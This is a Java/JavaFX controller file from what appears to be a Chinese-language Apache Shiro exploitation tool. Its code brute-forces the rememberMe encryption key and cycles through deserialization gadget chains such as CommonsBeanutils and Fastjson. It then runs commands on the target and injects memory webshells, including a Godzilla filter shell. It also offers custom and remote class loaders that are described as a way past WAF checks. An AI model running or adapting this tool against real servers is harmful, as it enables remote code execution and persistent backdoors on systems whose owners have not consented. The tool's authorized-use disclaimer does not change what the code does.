package com.sma11new.controller;

import com.sma11new.config.Config;
import com.sma11new.exp.shiro.attack.echo.CustomLoader;
import com.sma11new.utils.HttpMsgUtil;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import com.sma11new.exp.shiro.ShiroAttack;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Region;
import javafx.scene.layout.VBox;
import javafx.scene.text.Font;
import javafx.scene.text.FontPosture;
import javafx.scene.text.FontWeight;
import javafx.stage.Window;

import java.net.Authenticator;
import java.net.InetSocketAddress;
import java.net.PasswordAuthentication;
import java.net.Proxy;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

import static com.sma11new.exp.shiro.attack.memShell.MemBytes.MEM_MAP;

public class ShiroController {
    @FXML
    private MenuItem proxySetupBtn;
    @FXML
    private Label proxyStatusLabel;
    @FXML
    private MenuItem timeoutSetupBtn;
    @FXML
    public TextArea basicInfo;

    @FXML
    private TextField urlInput;

    @FXML
    private TabPane execCmdTabPane;

    @FXML
    private TextField cmdInput;

    @FXML
    public TextArea cmdOutput;

    @FXML
    private Button execCmdBtn;

    @FXML
    public TextArea memShellInjectInfo;

    @FXML
    private Button memShellInjectBtn;

    @FXML
    private ChoiceBox<String> memShellChoiceBox;

    @FXML
    private TextField memShellPathInput;

    @FXML
    private TextField cookieFlagInput;

    @FXML
    private CheckBox postRequestCheckBox;

    @FXML
    private CheckBox complexReqCheckBox;

    @FXML
    public CheckBox httpsReqCheckBox;
    @FXML
    public CheckBox keepCookieCheckBox;

    @FXML
    private TextArea complexReqTextArea;

    @FXML
    public TextField keyInput;

    @FXML
    private Button CheckCurrentKeyBtn;

    @FXML
    private Button enumAllKeysBtn;

    @FXML
    public ChoiceBox<String> chainChoiceBox;

    @FXML
    public ChoiceBox<String> echoChoiceBox;

    @FXML
    private CheckBox AES_GCM_ModeCheckBox;

    @FXML
    private Button enumAllChainsBtn;

    @FXML
    private Button CheckCurrentChainBtn;

    @FXML
    private TextField shellPassword;

    private boolean isShiro = false;
    private volatile boolean stopCheckAllKeys = false;
    private volatile boolean stopCheckAllChains = false;
    // 代理相关信息保存
    public static Map<String, Object> proxySettingInfo = new HashMap();

    boolean enableCustomLoader = false;

    @FXML
    public void initialize() {
        initializeCommon();
        // 设置
        this.initToolbar();

        InetSocketAddress proxyAddr = new InetSocketAddress("127.0.0.1", 8083);
        proxySettingInfo.put("proxy", new Proxy(Proxy.Type.HTTP, proxyAddr));
        urlInput.setText("http://127.0.0.1:8080/");
        // System.out.println(CustomLoader.loaderCodeWithSecondWay);
    }

    protected void initializeCommon() {
        chainChoiceBox.getItems().add("CommonsBeanutils1");
        chainChoiceBox.getItems().add("CommonsBeanutils1_183");
        chainChoiceBox.getItems().add("CommonsBeanutilsAttrCompare");
        chainChoiceBox.getItems().add("CommonsBeanutilsAttrCompare_183");
        chainChoiceBox.getItems().add("CommonsBeanutilsObjectToStringComparator");
        chainChoiceBox.getItems().add("CommonsBeanutilsObjectToStringComparator_183");
        chainChoiceBox.getItems().add("CommonsBeanutilsPropertySource");
        chainChoiceBox.getItems().add("CommonsBeanutilsPropertySource_183");
        chainChoiceBox.getItems().add("CommonsCollections2");
        chainChoiceBox.getItems().add("CommonsCollections3");
        chainChoiceBox.getItems().add("CommonsCollectionsK1");
        chainChoiceBox.getItems().add("CommonsCollectionsK2");
        chainChoiceBox.getItems().add("CommonsBeanutilsString");
        chainChoiceBox.getItems().add("CommonsBeanutilsString_183");
        chainChoiceBox.getItems().add("CommonsBeanutilsString_192s");
        chainChoiceBox.getItems().add("CommonsBeanutils192NOCC");
        chainChoiceBox.getItems().add("Fastjson1");
        chainChoiceBox.getItems().add("Fastjson2");

        echoChoiceBox.getItems().add("AllEcho");
        echoChoiceBox.getItems().add("TomcatEcho");
        echoChoiceBox.getItems().add("SpringEcho");

        chainChoiceBox.setValue("CommonsBeanutils1");
        echoChoiceBox.setValue("SpringEcho");

        memShellChoiceBox.getItems().addAll(MEM_MAP.keySet().stream().sorted().collect(Collectors.toList()));

        memShellChoiceBox.setValue("哥斯拉[Filter]");

        basicInfo.appendText("提示：普通url和复杂请求二选一，复杂请求中所有数据会被携带，https的复杂请求需要勾选https\n\n");
        memShellInjectInfo.appendText("提示：优先注入Filter内存马，成功率较高。\n\n");

        // AES_GCM模式
        AES_GCM_ModeCheckBox.selectedProperty().addListener((observable, oldValue, newValue) -> {
            ShiroAttack.AES_GCM_MODE = newValue;
        });

        postRequestCheckBox.selectedProperty().addListener((observable, oldValue, newValue) -> {
            ShiroAttack.isPost = !ShiroAttack.isPost;
        });

        // 复杂请求
        complexReqCheckBox.selectedProperty().addListener((observable, oldValue, newValue) -> {
            complexReqTextArea.setDisable(!newValue);
            httpsReqCheckBox.setDisable(!newValue);
            keepCookieCheckBox.setDisable(!newValue);
            urlInput.setDisable(newValue);
            ShiroAttack.complexReq = newValue;
        });
    };


    @FXML
    private void checkKey() {
        basicInfo.appendText("\n【开始验证Shiro及key】 " + urlInput.getText().trim() + "\n");
        // 使用checkIsShiro方法并提供一个回调，其中包含checkKey的逻辑
        checkIsShiro(isShiroResult -> {
            if (isShiroResult) {
                new Thread(() -> {
                    String url = urlInput.getText().trim();
                    String cookieFlag = cookieFlagInput.getText().trim();
                    String key = keyInput.getText().trim();

                    final String tmpUrl;
                    if (complexReqCheckBox.isSelected()) {
                        ShiroAttack.complexReq = true;
                        ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                                complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
                        tmpUrl = (String) ShiroAttack.reqMsg.get("url");
                    } else {
                        tmpUrl = url;
                    }

                    boolean keyValid = ShiroAttack.checkKey(tmpUrl, cookieFlag, key);

                    // 确保在JavaFX主线程中更新UI
                    Platform.runLater(() -> {
                        if (keyValid) {
                            basicInfo.appendText("[+_+]  发现Key：" + key + "\n");
                            basicInfo.appendText("[~_>]  小黑子露出鸡脚了吧~~~\n");
                        } else
                            basicInfo.appendText("[-_-]  Key错误：" + key + "\n");
                    });
                }).start();
            }
        });
    }


    @FXML
    public void checkAllKeys() {
        basicInfo.appendText("\n【开始爆破key】 " + urlInput.getText().trim() + "\n");
        checkIsShiro(isShiroResult -> {
            if (isShiroResult) {
                List<String> allKeys = ShiroAttack.getAllKeys();
                String url = urlInput.getText().trim();
                String cookieFlag = cookieFlagInput.getText().trim();

                final String tmpUrl;
                if (complexReqCheckBox.isSelected()) {
                    ShiroAttack.complexReq = true;
                    ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                            complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
                    tmpUrl = (String) ShiroAttack.reqMsg.get("url");
                } else tmpUrl = url;

                Thread thread = new Thread(() -> {
                    for (String key : allKeys) {
                        // 配置复杂数据
                        if (complexReqCheckBox.isSelected()) {
                            ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                                    complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
                        }
                        if (stopCheckAllKeys) { // 检查是否应该停止
                            stopCheckAllKeys = false; // 复原
                            Platform.runLater(() ->
                                    basicInfo.appendText("已停止检测所有Keys\n")
                            );
                            return; // 退出线程
                        }
                        boolean isCorrectKey = ShiroAttack.checkKey(tmpUrl, cookieFlag, key);
                        final String keyResult = key;
                        Platform.runLater(() -> {
                            if (isCorrectKey) {
                                basicInfo.appendText("[+_+]  发现Key：" + keyResult + "\n");
                                basicInfo.appendText("[~_~]  哎哟，你干嘛~~~");
                                keyInput.setText(keyResult);
                            } else {
                                basicInfo.appendText("[-_-]  Key不正确：" + keyResult + "\n");
                            }
                        });

                        if (isCorrectKey) return;
                        try {
                            // 休眠0.2秒，避免错误丢包
                            Thread.sleep(200);
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt(); // 重置中断状态
                            return;
                        }
                    }
                    Platform.runLater(() ->
                            basicInfo.appendText("[-_-]  共爆破 " + allKeys.size() + " ，未发现key\n")
                    );
                });
                thread.start();
            }
        });
    }

    // 检测当前利用链和回显
    @FXML
    private void checkChain() {
        basicInfo.appendText("\n【开始验证利用链】 " + urlInput.getText().trim() + "\n");
        if (complexReqCheckBox.isSelected()) {

        }
        if (!isShiro) {
            Platform.runLater(() -> basicInfo.appendText("[-_-]  先检测确认存在Shiro及Key\n"));
            return;
        }

        new Thread(() -> {
            String url = urlInput.getText().trim();
            String cookieFlag = cookieFlagInput.getText().trim();
            String key = keyInput.getText().trim();
            String chain = chainChoiceBox.getValue().trim();
            String echo = echoChoiceBox.getValue().trim();

            if (complexReqCheckBox.isSelected()) {
                ShiroAttack.complexReq = true;
                ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                        complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
                url = (String) ShiroAttack.reqMsg.get("url");
            }

            boolean isChainValid = ShiroAttack.checkChain(url, cookieFlag, key, chain, echo);

            Platform.runLater(() -> {
                if (isChainValid) {
                    basicInfo.appendText("[+_+]  发现利用链及回显！ 链：" + chain + "  回显：" + echo + "\n");
                    basicInfo.appendText("[>_~]  鸡，你太美！\n");
                } else
                    basicInfo.appendText("[-_-]  利用链及回显无法使用\n");
            });
        }).start();
    }

    // 枚举所有利用链及回显
    @FXML
    private void checkAllChains() {
        basicInfo.appendText("\n【开始爆破利用链及回显】 " + urlInput.getText().trim() + "\n");
        if (!isShiro) {
            Platform.runLater(() -> basicInfo.appendText("[-]  先检测确认存在Shiro及Key\n"));
            return;
        }
        String url = urlInput.getText().trim();
        String cookieFlag = cookieFlagInput.getText().trim();
        String key = keyInput.getText().trim();

        final String tmpUrl;
        if (complexReqCheckBox.isSelected()) {
            ShiroAttack.complexReq = true;
            ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                    complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
            tmpUrl = (String) ShiroAttack.reqMsg.get("url");
        } else {
            tmpUrl = url;
        }

        Thread thread = new Thread(() -> {
            for (String echo : echoChoiceBox.getItems()) {
                for (String chain : chainChoiceBox.getItems()) {
                    // 配置复杂数据
                    if (complexReqCheckBox.isSelected()) {
                        ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                                complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
                    }
                    if (stopCheckAllChains) { // 检查是否应该停止
                        stopCheckAllChains = false;  // 复原
                        Platform.runLater(() ->
                            basicInfo.appendText("已停止检测所有利用链及回显\n")
                        );
                        return; // 退出线程
                    }
                    boolean isChainValid = ShiroAttack.checkChain(tmpUrl, cookieFlag, key, chain, echo);
                    final String chainFinal = chain; // 在Lambda表达式中使用需要是final或effectively final
                    final String echoFinal = echo;
                    Platform.runLater(() -> {
                        if (isChainValid) {
                            basicInfo.appendText("[+++]  发现利用链及回显！ 链：" + chainFinal + "  回显：" + echoFinal + "\n");
                            chainChoiceBox.setValue(chainFinal);
                            echoChoiceBox.setValue(echoFinal);
                        } else {
                            basicInfo.appendText("[-]  尝试回显：" + echoFinal + "  链：" + chainFinal + "\n");
                        }
                    });
//                    if (isChainValid) return; // 当发现有效链时立即返回
                    try {
                        Thread.sleep(300); // 休眠0.3秒，避免错误丢包
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt(); // 保持线程的中断状态
                        return; // 不再继续执行
                    }
                }
            }
            if (basicInfo.getText().contains("发现利用链及回显"))
                Platform.runLater(() -> basicInfo.appendText("[+++]  发现利用链及回显，自行选择使用\n"));
            else Platform.runLater(() -> basicInfo.appendText("[-]  未发现利用链及回显\n"));
        });
        thread.start(); // 开始线程，不再调用join，以避免阻塞UI线程。
    }

    @FXML
    private void execCmd() {
        String url = urlInput.getText().trim();
        String cookieFlag = cookieFlagInput.getText().trim();
        String key = keyInput.getText().trim();
        String chain = chainChoiceBox.getValue().trim();
        String echo = echoChoiceBox.getValue().trim();
        String cmd = cmdInput.getText().trim();

        final String tmpUrl;
        if (complexReqCheckBox.isSelected()) {
            ShiroAttack.complexReq = true;
            ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                    complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
            tmpUrl = (String) ShiroAttack.reqMsg.get("url");
        } else {
            tmpUrl = url;
        }

        Thread thread = new Thread(() -> {
            String result = ShiroAttack.execCmd(tmpUrl, cookieFlag, key, chain, echo, cmd);
            Platform.runLater(() -> cmdOutput.appendText("【+】 执行结果：\n" + result + "\n\n"));
        });
        thread.start();
    }

    @FXML
    private void injectMemShell() {
        // 处理内存马注入按钮点击事件的代码
        String url = urlInput.getText().trim();
        String cookieFlag = cookieFlagInput.getText().trim();
        String key = keyInput.getText().trim();
        String chain = chainChoiceBox.getValue().trim();
        String memShell = memShellChoiceBox.getValue().trim();
        String path = memShellPathInput.getText().trim();
        String password = shellPassword.getText().trim();

        final String tmpUrl;
        if (complexReqCheckBox.isSelected()) {
            ShiroAttack.complexReq = true;
            ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                    complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
            tmpUrl = (String) ShiroAttack.reqMsg.get("url");
        } else tmpUrl = url;

        Thread thread = new Thread(() -> {
            String result = ShiroAttack.injectMemShell(tmpUrl, cookieFlag, key, chain, memShell, path, password);
            Platform.runLater(() -> {
                if (result.contains("注入失败")) {
                    memShellInjectInfo.appendText(result + "\n\n");
                } else if (memShell.contains("哥斯拉")) {
                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + result + "  密码：" + password + " 密钥：key\n\n");
                } else if (memShell.contains("命令执行")) {
                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功： " + tmpUrl + "?name=&user=whoami \n" +
                            "【可选】 type参数：设置响应编码 (utf-8 | gbk)\n" +
                            "【可选】 base参数: 默认不填，存在则需要将 user参数 的值用base64编码\n" +
                            " POST请求时，修改请求头：Content-Type: application/x-www-form-urlencoded \n\n");
                } else if (memShell.contains("动态类加载")) {
                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + tmpUrl + "\n" +
                            "【可选】 enable参数： 默认不填，启用加载标识\n" +
                            "【可选】 code参数：传入base64编码后的class\n" +
                            " POST请求时，修改请求头：Content-Type: application/x-www-form-urlencoded \n\n");
                } else {
                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + result + "  密码：" + password + "\n\n");
                }
            });
        });
        thread.start();
    }

    @FXML
    private void stopCheckAllKeys() {
        stopCheckAllKeys = true;
    }

    @FXML
    private void stopCheckAllChains() {
        stopCheckAllChains = true;
    }

    @FunctionalInterface
    public interface ShiroCheckCallback {
        void onCheckComplete(boolean isShiro);
    }


    private void checkIsShiro(ShiroCheckCallback callback) {
        new Thread(() -> {
            String url = urlInput.getText().trim();
            String cookieFlag = cookieFlagInput.getText().trim();

            if (complexReqCheckBox.isSelected()) {
                // 在子线程中进行复杂请求的处理
                ShiroAttack.reqMsg = HttpMsgUtil.parseRawHttpRequest(
                        complexReqTextArea.getText(), httpsReqCheckBox.isSelected(), keepCookieCheckBox.isSelected());
                url = (String) ShiroAttack.reqMsg.get("url");
            }
            // 检测是否是Shiro框架
            isShiro = ShiroAttack.checkIsShiro(url, cookieFlag);


            // 确保UI更新在JavaFX应用线程中执行
            Platform.runLater(() -> {
                if (isShiro)
                    basicInfo.appendText("[+_+]  检测到Shiro框架！\n");
                else
                    basicInfo.appendText("[-_-]  未检测到Shiro框架\n");
                callback.onCheckComplete(isShiro);
            });
        }).start(); // 启动线程
    }

    // 监听菜单免责声明事件
    @FXML
    public void disclaimer() {
        Alert alert = new Alert(Alert.AlertType.NONE);
        // 点 x 退出
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });
        DialogPane dialogPane = new DialogPane();
        Label label = new Label("本工具仅用于内部网络安全自查及授权项目\n\n\t请勿非法使用，否则后果自负！");
        label.setStyle("-fx-text-fill: #d71f0e; -fx-font-weight: bold; -fx-alignment: center;");
        dialogPane.setContent(label);
        alert.setDialogPane(dialogPane);
        alert.showAndWait();
    }

    @FXML
    public void customLoader() {
        Alert inputDialog = new Alert(Alert.AlertType.NONE);
        Window window = inputDialog.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });
        inputDialog.setTitle("自定义加载器");

        // 创建 Label，并设置文本
        Label label = new Label("当遇到Cookie长度限制、waf检测反序列化值时，自定义加载器代码绕过检测。");
        label.setMaxWidth(700);
        label.setWrapText(true); // 设置文本自动换行
        // label.setAlignment(Pos.CENTER); // 设置HBox水平居中对齐
        // 设置字体样式，可以根据需要调整字体大小和粗细
        Font font = Font.font("", FontWeight.BOLD, FontPosture.REGULAR, 15);
        label.setFont(font);
        label.setStyle("-fx-text-fill: green; -fx-font-weight: bold;");

        Label tips = new Label("温馨提示：\n" +
                "  \"#{className}\"是默认的类名，如果你的加载器需要类名，请不要修改或删除这个字符串。\n" +
                "  当你的加载器不需要类名则忽略该字符串。\n\n" +
                "  1.不要忘记调用 equal 方法哦！不然内存马无法初始化~~~\n" +
                "  2.可以选择远程加载的方式，编码后加载器的长度会更小。接近常见业务的长度，前提是目标机器出网。\n" +
                "  3.仅支持POST请求方式，因为http header长度有限制，虽然有其他方式可以绕过，但无疑会增加cookie的大小。");
        tips.setMaxWidth(700);
        tips.setWrapText(true); // 设置文本自动换行
        tips.setFont(font);
        tips.setStyle("-fx-text-fill: grey; -fx-font-size: 12px; -fx-font-weight: bold;");

        ToggleGroup statusGroup = new ToggleGroup();
        RadioButton enableRadio = new RadioButton("启用");
        RadioButton disableRadio = new RadioButton("禁用");
        enableRadio.setToggleGroup(statusGroup);
        disableRadio.setToggleGroup(statusGroup);
        if (enableCustomLoader) {
            enableRadio.setSelected(true);
        } else {
            disableRadio.setSelected(true);
        }

        HBox statusHbox = new HBox();
        statusHbox.setSpacing(10.0D);
        statusHbox.getChildren().add(enableRadio);
        statusHbox.getChildren().add(disableRadio);
        statusHbox.setPadding(new Insets(4, 0, 0, 0));

        Button cancelBtn = new Button("取消");
        Button sureBtn = new Button("确定");
        Button templateFirst = new Button("模板一");
        Button templateSecond = new Button("模板二");
        Button templateRemote = new Button("远程加载器模板");

        TextArea textArea = new TextArea();
        textArea.setWrapText(true);
        textArea.setMaxWidth(700);
        textArea.setMinHeight(300);
        if (CustomLoader.currentLoaderCode == null) {
            textArea.appendText(CustomLoader.loaderCodeWithSecondWay);
        } else {
            textArea.appendText(CustomLoader.currentLoaderCode);
        }

        GridPane customLoaderGridPane = new GridPane();
        customLoaderGridPane.setVgap(15.0D);
        customLoaderGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));

        sureBtn.setOnAction((v) -> {
            if (enableRadio.isSelected()) {
                ShiroAttack.enableCustomLoader = true;
                postRequestCheckBox.setSelected(true);
                CustomLoader.currentLoaderCode = textArea.getText();
                enableCustomLoader = true;
            } else {
                ShiroAttack.enableCustomLoader = false;
                postRequestCheckBox.setSelected(false);
                enableCustomLoader = false;
            }

            inputDialog.getDialogPane().getScene().getWindow().hide();
        });
        cancelBtn.setOnAction((e) -> {
            inputDialog.getDialogPane().getScene().getWindow().hide();
        });

        templateFirst.setOnAction((v) -> {
            textArea.setText(CustomLoader.loaderCodeWithFirstWay);
        });

        templateSecond.setOnAction((v) -> {
            textArea.setText(CustomLoader.loaderCodeWithSecondWay);
        });

        templateRemote.setOnAction((v) -> {
            textArea.setText(CustomLoader.loaderCodeWithRemoteWay);
        });


        customLoaderGridPane.add(label, 0 ,0);
        customLoaderGridPane.add(tips,  0,1);
        customLoaderGridPane.add(textArea, 0, 2);

        HBox buttonBox = new HBox();
        buttonBox.setSpacing(20.0D);
        buttonBox.setAlignment(Pos.CENTER);

        buttonBox.getChildren().add(statusHbox);
        buttonBox.getChildren().add(cancelBtn);
        buttonBox.getChildren().add(sureBtn);

        HBox buttonBoxNext = new HBox();
        buttonBoxNext.setSpacing(20.0D);
        buttonBoxNext.setAlignment(Pos.CENTER);
        buttonBoxNext.getChildren().add(templateFirst);
        buttonBoxNext.getChildren().add(templateSecond);
        buttonBoxNext.getChildren().add(templateRemote);

        // GridPane.setColumnSpan(buttonBox, 2);
        customLoaderGridPane.add(buttonBoxNext, 0, 3);
        customLoaderGridPane.add(buttonBox, 0, 4);
        // customLoaderGridPane.add(statusHbox, 0, 3);

        inputDialog.getDialogPane().setContent(customLoaderGridPane);
        inputDialog.showAndWait();
    }

    // 监听菜单关于事件
    @FXML
    public void about() {
        Alert alert = new Alert(Alert.AlertType.NONE);
        // 点 x 退出
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });

        DialogPane dialogPane = new DialogPane();

        // 使用 VBox 来容纳 ImageView 和 Label，并设置间隔
        VBox vBox = new VBox();
        vBox.setSpacing(5); // 设置间隔大小，可以根据需要调整

        // 创建 Label，并设置文本
        Label label = new Label("Shiro利用工具");
        label.setMaxWidth(700);
        label.setWrapText(true); // 设置文本自动换行
        label.setAlignment(Pos.CENTER); // 设置HBox水平居中对齐

        TextArea textArea = new TextArea();
        textArea.setWrapText(true);
        textArea.setEditable(false);
        textArea.setMaxWidth(700);
        textArea.setMaxHeight(300);
        textArea.appendText(Config.UPDATEINFO);

        // 设置字体样式，可以根据需要调整字体大小和粗细
        Font font = Font.font("", FontWeight.BOLD, FontPosture.REGULAR, 15);
        label.setFont(font);

        // 创建一个具有一定高度的 Region 来作为垂直间距的占位符
        Region spacer = new Region();
        spacer.setPrefHeight(10); // 设置高度，可以根据需要调整

        // 将 ImageView、spacer 和 Label 添加到 VBox 中
        vBox.getChildren().addAll(label, spacer, textArea);

        // 将 VBox 设置为 DialogPane 的内容
        dialogPane.setContent(vBox);

        alert.setDialogPane(dialogPane);

        alert.showAndWait();
    }

    // 监听菜单事件
    private void initToolbar() {
        //代理 设置
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(Alert.AlertType.NONE);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            inputDialog.setTitle("代理设置");
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            disableRadio.setSelected(true);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("类型：");
            ComboBox typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList("HTTP", "SOCKS"));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP地址：");
            TextField IPText = new TextField("127.0.0.1");
            Label PortLabel = new Label("端口：");
            TextField PortText = new TextField("8083");
            Label userNameLabel = new Label("用户名：");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码：");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");


            try {
                Proxy proxy = (Proxy) proxySettingInfo.get("proxy");
                if (proxy != null) {
                    enableRadio.setSelected(true);

                } else {
                    disableRadio.setSelected(true);
                }

                if (proxySettingInfo.size() > 0) {
                    String type = (String) proxySettingInfo.get("type");
                    if (type.equals("HTTP")) {
                        typeCombo.getSelectionModel().select(0);
                    } else if (type.equals("SOCKS")) {
                        typeCombo.getSelectionModel().select(1);
                    }

                    String ip = (String) proxySettingInfo.get("ip");
                    String port = (String) proxySettingInfo.get("port");
                    IPText.setText(ip);
                    PortText.setText(port);
                    String username = (String) proxySettingInfo.get("username");
                    String password = (String) proxySettingInfo.get("password");
                    userNameText.setText(username);
                    passwordText.setText(password);
                }


            } catch (Exception var) {
                proxyStatusLabel.setText("<代理加载失败>");
//                logger.debug(var);
            }


            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    proxySettingInfo.put("proxy", (Object) null);
                    proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {

                    final String type;
                    if (!userNameText.getText().trim().equals("")) {
                        final String proxyUser = userNameText.getText().trim();
                        type = passwordText.getText();
                        Authenticator.setDefault(new Authenticator() {
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(proxyUser, type.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault((Authenticator) null);
                    }

                    proxySettingInfo.put("username", userNameText.getText());
                    proxySettingInfo.put("password", passwordText.getText());
                    InetSocketAddress proxyAddr = new InetSocketAddress(IPText.getText(), Integer.parseInt(PortText.getText()));

                    proxySettingInfo.put("ip", IPText.getText());
                    proxySettingInfo.put("port", PortText.getText());
                    String proxy_type = typeCombo.getValue().toString();
                    proxySettingInfo.put("type", proxy_type);
                    Proxy proxy;
                    if (proxy_type.equals("HTTP")) {
                        proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                        proxySettingInfo.put("proxy", proxy);
                    } else if (proxy_type.equals("SOCKS")) {
                        proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                        proxySettingInfo.put("proxy", proxy);
                    }

                    String proxyInfo = proxySettingInfo.get("type")
                            + "://" + proxySettingInfo.get("ip")
                            + ":" + proxySettingInfo.get("port");
                    proxyStatusLabel.setText("<代理生效中> " + proxyInfo);
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }
            });

            cancelBtn.setOnAction((e) -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();

        });

        // 超时设置
        this.timeoutSetupBtn.setOnAction((event -> {
            Alert inputDialog = new Alert(Alert.AlertType.NONE);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            inputDialog.setTitle("超时设置");
            GridPane timeoutGridPane = new GridPane();
            timeoutGridPane.setVgap(15.0D);
            timeoutGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label connectTimeoutLabel = new Label("请求超时/s：");
            TextField connectTimeout = new TextField("" + Config.CONNECT_TIME_OUT);
            Label readTimeoutLabel = new Label("读取超时/s：");
            TextField readTimeout = new TextField("" + Config.READ_TIME_OUT);
            Button restoreDefaultBtn = new Button("恢复默认");
            Button saveBtn = new Button("保存设置");

            saveBtn.setOnAction((e) -> {
                Config.CONNECT_TIME_OUT = Integer.parseInt(connectTimeout.getText().trim());
                Config.READ_TIME_OUT = Integer.parseInt(readTimeout.getText().trim());
                inputDialog.getDialogPane().getScene().getWindow().hide();

            });

            restoreDefaultBtn.setOnAction((e) -> {
                connectTimeout.setText("5");
                readTimeout.setText("10");
            });

            timeoutGridPane.add(connectTimeoutLabel, 0, 1);
            timeoutGridPane.add(connectTimeout, 1, 1);
            timeoutGridPane.add(readTimeoutLabel, 0, 2);
            timeoutGridPane.add(readTimeout, 1, 2);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(restoreDefaultBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            timeoutGridPane.add(buttonBox, 0, 3);
            inputDialog.getDialogPane().setContent(timeoutGridPane);
            inputDialog.showAndWait();
        }));
    }

    public void setProxyStatusLabel(String value) {
        this.proxyStatusLabel.setText(value);
    }
}
